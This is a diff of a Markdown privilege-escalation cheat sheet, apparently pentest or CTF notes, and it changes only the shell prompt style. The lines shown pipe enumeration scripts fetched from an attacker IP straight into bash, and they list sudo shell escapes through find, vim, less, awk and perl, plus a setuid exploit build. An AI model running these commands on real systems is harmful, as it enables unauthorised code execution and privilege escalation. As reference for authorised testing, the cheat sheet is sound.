@@ -24,8 +24,8 @@ date updated: '2021-03-25T17:36:52-03:00'
 
 - On the target's machine we can do:
 ```bash
-$ curl 10.10.14.2/linpeas.sh | bash
-$ curl 10.10.14.2/LinEnum.sh | bash
+$> curl 10.10.14.2/linpeas.sh | bash
+$> curl 10.10.14.2/LinEnum.sh | bash
 ```
 
 -----
@@ -57,22 +57,22 @@ reset; sh 1>&0 2>&0
 ## Sudo privilege escalation
 ### Listing allowed ``sudo`` commands
 ```bash
-$ sudo -l
+$> sudo -l
 ```
 
 ### Impersonating with ``sudo``
 ```bash
-$ sudo -u victim command
+$> sudo -u victim command
 ```
 
 ### Escalating privileges with ``find`` command
 ```bash
-$ sudo -u victim /usr/bin/find -exec /bin/bash \;
+$> sudo -u victim /usr/bin/find -exec /bin/bash \;
 ```
 
 ### Escalating privileges with ``vim`` editor
 ```bash
-$ sudo -u victim /usr/bin/vim
+$> sudo -u victim /usr/bin/vim
 
 # Inside the vim we can call a shell
 :!/bin/bash
@@ -81,7 +81,7 @@ $ sudo -u victim /usr/bin/vim
 ### Escalating privileges with  ``less`` command
 - Open a file using less
 ```
-$ sudo -u victim less /home/victim/key.txt
+$> sudo -u victim less /home/victim/key.txt
 ```
 
 - Inside the less we can call a shell
@@ -92,10 +92,10 @@ $ sudo -u victim less /home/victim/key.txt
 ### Escalating privileges with ``awk`` command
 ```bash
 # Reading files with awk
-$ sudo -u victim /usr/bin/awk '{print $1}' /home/victim/key.txt
+$> sudo -u victim /usr/bin/awk '{print $1}' /home/victim/key.txt
 
 # Executing command within awk
-$ sudo -u victim /usr/bin/awk 'BEGIN {system("/bin/bash")}'
+$> sudo -u victim /usr/bin/awk 'BEGIN {system("/bin/bash")}'
 ```
 
 ### Escalating privileges with ``chmod``
@@ -112,18 +112,18 @@ int main(void)
 
 - Compiling the exploit
 ```bash
-$ cd /tmp
-$ gcc exploit.c -o exploit
+$> cd /tmp
+$> gcc exploit.c -o exploit
 ```
 
 - Setting the __setuid__ and __setgid__ flags
 ```bash
-$ sudo -u victim cp exploit exploit2
-$ sudo -u victim chmod +xs exploit2
-$ ./exploit2
+$> sudo -u victim cp exploit exploit2
+$> sudo -u victim chmod +xs exploit2
+$> ./exploit2
 ```
 
 ### Escalating privileges with ``perl``
 ```bash
-$ sudo -u victim perl -e 'exec "/bin/bash";'
+$> sudo -u victim perl -e 'exec "/bin/bash";'
 ```
